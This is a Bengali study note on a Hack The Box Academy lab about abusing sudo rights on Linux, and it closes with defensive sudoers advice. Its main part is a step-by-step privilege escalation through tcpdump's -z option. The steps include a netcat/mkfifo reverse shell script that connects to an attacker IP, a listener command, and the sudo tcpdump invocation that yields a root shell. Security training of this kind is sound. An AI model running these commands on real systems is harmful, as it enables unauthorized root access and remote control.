# Sudo Rights Abuse - [LINK](https://academy.hackthebox.com/app/module/51/section/471)



লিনাক্স সিস্টেমে `sudo` (Superuser do) একটি অত্যন্ত গুরুত্বপূর্ণ কমান্ড। এর মাধ্যমে একজন সাধারণ ইউজার রুট (root) বা অ্যাডমিনের ক্ষমতা নিয়ে নির্দিষ্ট কিছু কমান্ড চালাতে পারে, যার জন্য তাকে রুট অ্যাকাউন্টে পুরোপুরি লগইন করতে হয় না। কোন ইউজার কী কী কমান্ড `sudo` দিয়ে চালাতে পারবে, তা সিস্টেমের `/etc/sudoers` ফাইলে কনফিগার করা থাকে।

যেকোনো লিনাক্স সিস্টেমে ঢোকার পর আমাদের প্রথম কাজগুলোর একটি হলো বর্তমান ইউজারের `sudo` পারমিশন চেক করা।

**পারমিশন চেক করার কমান্ড:**

```bash
htb_student@NIX02:~$ sudo -l

```

**আউটপুট উদাহরণ:**

```text
Matching Defaults entries for sysadm on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sysadm may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/tcpdump

```

এখানে সবচেয়ে গুরুত্বপূর্ণ শব্দটি হলো **`NOPASSWD`**। এর মানে হলো, ইউজার কোনো পাসওয়ার্ড ছাড়াই রুট (root) হিসেবে `tcpdump` কমান্ডটি চালাতে পারবে। অ্যাডমিনদের এই ছোট কনফিগারেশন ভুলের কারণেই সিস্টেমে প্রিভিলেজ এসকালেশন বা হ্যাকিং সম্ভব হয়।

## tcpdump এর দুর্বলতা কাজে লাগানো (Exploitation)

`tcpdump` হলো নেটওয়ার্ক ট্রাফিক অ্যানালাইজ করার একটি টুল। কিন্তু আমরা যদি এর ম্যানুয়াল পেজ (`man tcpdump`) পড়ি, তবে দেখব এতে `-z` বা `postrotate-command` নামের একটি অপশন আছে।

এই অপশনটির কাজ হলো, ফাইল সেভ হওয়ার পর নির্দিষ্ট কোনো স্ক্রিপ্ট বা কমান্ড রান করা। যেহেতু আমরা `tcpdump` কে `sudo` (অর্থাৎ রুট হিসেবে) চালাচ্ছি, তাই `-z` এর মাধ্যমে আমরা যে স্ক্রিপ্টই রান করতে বলব, সেটি রুট পারমিশন নিয়েই রান হবে!

### অ্যাটাকের ধাপসমূহ:

**ধাপ ১: রিভার্স শেল স্ক্রিপ্ট তৈরি করা**
প্রথমে আমরা `/tmp` ফোল্ডারে `.test` নামে একটি স্ক্রিপ্ট তৈরি করব, যার ভেতরে আমাদের অ্যাটাকিং মেশিনের সাথে কানেক্ট হওয়ার জন্য একটি রিভার্স শেল (Reverse Shell) কোড থাকবে।

```bash
htb_student@NIX02:~$ cat /tmp/.test
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f

```

*(এই কোডটি মূলত আমাদের অ্যাটাকিং আইপি `10.10.14.3` এবং পোর্ট `443` তে কানেকশন পাঠাবে)।*

**ধাপ ২: অ্যাটাকিং মেশিনে লিসেনার (Listener) চালু করা**
আমাদের অ্যাটাকিং মেশিনে কানেকশন রিসিভ করার জন্য netcat চালু করতে হবে:

```bash
00Luffy00@htb[/htb]$ nc -lnvp 443

```

**ধাপ ৩: পেলোড এক্সিকিউট করা**
এবার আমরা টার্গেট মেশিনে `tcpdump` এর ওই দুর্বল অপশনটি ব্যবহার করে আমাদের বানানো স্ক্রিপ্টটি রান করব:

```bash
htb_student@NIX02:~$ sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root

```

**কমান্ডের সহজ ব্যাখ্যা:**

* `-i ens192`: ens192 ইন্টারফেসে ট্রাফিক শুনবে।
* `-w /dev/null`: ডেটাগুলো সেভ না করে বাতিল করে দেবে (কারণ আমাদের ডেটা দরকার নেই)।
* `-W 1 -G 1`: এক সেকেন্ড পর পর ফাইল রোটেট বা রিফ্রেশ করবে।
* `-z /tmp/.test`: রিফ্রেশ হওয়ার সাথে সাথে আমাদের ম্যালিশিয়াস `.test` স্ক্রিপ্টটি রান করবে।
* `-Z root`: স্ক্রিপ্টটি রুট (root) ইউজার হিসেবে রান করবে।

**ফলাফল:**
কমান্ডটি দেওয়ার প্রায় সাথে সাথেই আপনার অ্যাটাকিং মেশিনে রুট শেল (Root Shell) চলে আসবে!

```bash
root@NIX02:~# id && hostname               
uid=0(root) gid=0(root) groups=0(root)
NIX02

```

## AppArmor এর ভূমিকা (সিকিউরিটি অ্যালার্ট)

আধুনিক লিনাক্স ডিস্ট্রিবিউশনগুলোতে **AppArmor** নামের একটি সিকিউরিটি ফিচার থাকে। এটি `tcpdump` এর `postrotate-command` অপশনটিকে রেস্ট্রিক্ট বা ব্লক করে দেয়, যার ফলে এই অ্যাটাকটি নতুন সিস্টেমে সব সময় কাজ নাও করতে পারে। তবে পুরানো বা ভুল কনফিগার করা সিস্টেমে এটি দারুণ কাজ করে।

## Sudo কনফিগার করার সেরা উপায় (Best Practices)

সিস্টেম অ্যাডমিনদের এই ধরনের হ্যাকিং থেকে বাঁচার জন্য দুটি নিয়ম সবসময় মেনে চলা উচিত:

1. **Absolute Path ব্যবহার করা:** `/etc/sudoers` ফাইলে কমান্ডের নাম লেখার সময় সবসময় তার পুরো পাথ বা ঠিকানা দিতে হবে। শুধু `cat` না লিখে `/bin/cat` লিখতে হবে। নাহলে হ্যাকাররা PATH Abuse (যা আমরা অন্য সেকশনে দেখেছি) করে ফেক কমান্ড চালিয়ে দিতে পারে।
2. **Principle of Least Privilege:** ইউজারদের ঠিক ততটুকুই পারমিশন দেওয়া উচিত, যতটুকু তাদের কাজের জন্য দরকার। ঢালাওভাবে `sudo` পারমিশন দিলে বা খুব বেশি কমান্ড রান করার সুযোগ দিলে সিস্টেমের ঝুঁকি অনেক বেড়ে যায়।
